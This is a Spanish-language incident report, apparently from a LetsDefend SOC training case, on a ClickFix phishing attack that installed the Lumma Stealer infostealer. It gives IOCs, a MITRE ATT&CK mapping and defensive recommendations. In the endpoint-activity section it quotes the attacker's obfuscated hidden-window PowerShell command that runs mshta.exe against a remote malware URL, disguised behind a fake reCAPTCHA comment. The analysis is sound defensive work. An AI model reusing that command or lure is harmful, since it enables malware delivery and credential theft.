# Informe de Incidente - Lumma Stealer - DLL Side-Loading via Click Fix Phishing

## 1. Resumen Ejecutivo

Se investigó una alerta de seguridad relacionada con un ataque de phishing dirigido al endpoint Dylan.
El atacante envió un correo malicioso con un enlace que redirigía a un sitio fraudulento (https://www.windows-update[.]site/), desde el cual, mediante una técnica de ClickFix, engañó al usuario para que ejecutara manualmente un comando de PowerShell. Dicho comando descargó y ejecutó Lumma Stealer, un infostealer capaz de robar credenciales, cookies de sesión y datos del navegador.

La investigación determinó que se trata de un Verdadero Positivo.

---

## 2. Detalles de la Alerta

| Campo | Valor |
|---|---|
| Plataforma | LetsDefend |
| ID del Caso | SOC338 |
| Tipo de Alerta | Phishing / Data Leakage |
| Severidad | Crítica |
| Estado | Escalado |
| Analista | Jorge Fernández Córcoles |
| Fecha | 28/04/2026 |

---

## 3. Información Inicial de la Alerta

| Campo | Valor |
|---|---|
| Nombre de la alerta | Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| IP origen | 132.232.40.201 |
| IP destino | 172.16.17.216 |
| Hostname | Dylan |
| Usuario | |
| Hash del fichero | 15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03 |
| URL / Dominio | https://www.windows-update[.]site/ |
| Timestamp | Mar, 13, 2025, 09:44 AM |

---

## 4. Pasos de la Investigación

### 4.1 Revisión de la Alerta
La alerta mostraba un ataque hacia la máquina Dylan constando de 3 partes:
Parte inicial: El atacante usó correos maliciosos a modo de phishing para lograr que desde el endpoint se accediera al enlace. Este enlace redirige al siguiente sitio web, https://www.windows-update[.]site/. Escaneado con Virustotal, apreciamos que numerosos antivirus lo marcan como malicioso. 


### 4.2 Análisis de Logs
En los logs, vemos un GET del sitio malicioso con una respuesta 200 OK, lo que nos indica que el sitio fue accedido. Además, desde un Endpoint llamado Dylan. 

### 4.3 Análisis de IOCs
https://www.windows-update[.]site/ es el sitio malicioso que el atacante pretende hacer clicar. 
https://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4 es la URL que permite la descarga del malware posterior.
15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03 es el malware instalado en el Endpoint Dylan. 

### 4.4 Actividad del Usuario / Endpoint
Revisando ahora el EDR y filtrando por Dylan como Endpoint, vemos numerosos comandos ejecutandose desde el powershell.  "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w 1 powershell -Command ('ms]]]ht]]]a]]].]]]exe https://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace ']') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824''

Aquí nos encontramos ante un intento de descarga de malware donde el atacante busca que el usuario no se de cuenta. Lo primero, que lo hace desde powershell en modo oculto con -w 1. Realiza también ofuscación porque reemplaza los "]" por "", lo cual nos dice que el archivo que ejecuta el comando es mshta.exe. Y por último, tenemos lo siguiente: ✅ I am not a robot - reCAPTCHA Verification ID: 3824. Esto es un señuelo de ClickFix, lo utiliza el atacante para hacer ver al usuario que está cometiendo una descarga legítima, cuando en realidad no lo es. Posteriormente, vi el fileHash 15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03, de nuevo observado en Virustotal para evidenciar que en el Endpoint se había descargado un archivo malicioso y efectivamente lo era.
No se encontró evidencia de exfiltración confirmada en los logs disponibles. No obstante, dado que Lumma Stealer fue ejecutado con éxito, la exfiltración de credenciales y datos del navegador debe considerarse probable.

---

## 5. Hallazgos

- Correo malicioso con un botón que redirige a este sitio web, https://www.windows-update[.]site/. 
- Comando ejecutado desde el powershell en el Endpoint simulando una descarga legítima desde una URL maliciosa, https://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4. 
- Descarga final del archivo con el siguiente Hash, 15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03. 

---

## 6. Mapeo MITRE ATT&CK

| Táctica | Técnica | Sub-técnica | Descripción |
|---|---|---|---|
| Acceso Inicial | [T1566] | [T1566.002] | Envío de emails para conseguir que el usuario clique en el link malicioso |
| Ejecución | [T1059] | [T1059.001] | Ejecución de comandos desde el powershell para descargar malware en el Endpoint engañado por ClickFix |
| Evasión de Defensas | [T1027] | | Ofuscación para que el comando reemplace caracteres |
| Evasión de Defensas | [T1218] | [T1218.005] | Uso de mshta.exe como LOLBin para ejecutar código remoto |

---

## 7. Herramientas Utilizadas

| Herramienta | Uso |
|---|---|
| VirusTotal | Para analizar tanto las URL's como el FileHash maliciosos |
| Claude | A modo de información |
| Mitre Att&ck | Buscar información acerca de las técnicas que usó el atacante y para el mapeo |

---

## 8. Conclusión

| Campo | Valor |
|---|---|
| Clasificación | Verdadero Positivo |
| Impacto | Alto |

---

## 9. Acciones Recomendadas

- Inspección de los enlaces que entren al correo (Sandboxing) para que el Email Security Gateway abra los links en un entorno controlado y deje pasar los correos o no en función de lo que encuentre. 
- Simulaciones de phishing o campañas de phishing simulado. Para que los trabajadores de la empresa estén concienciados y seguros ante los ataques de este tipo. 
- Revisar y endurecer la configuración del EDR existente para bloquear procesos maliciosos si el phishing logra que el usuario descargue algo.
- Restringir la ejecución de mshta.exe mediante AppLocker o políticas de grupo, ya que es un LOLBin que no debería ejecutarse en máquinas de usuario normal.
---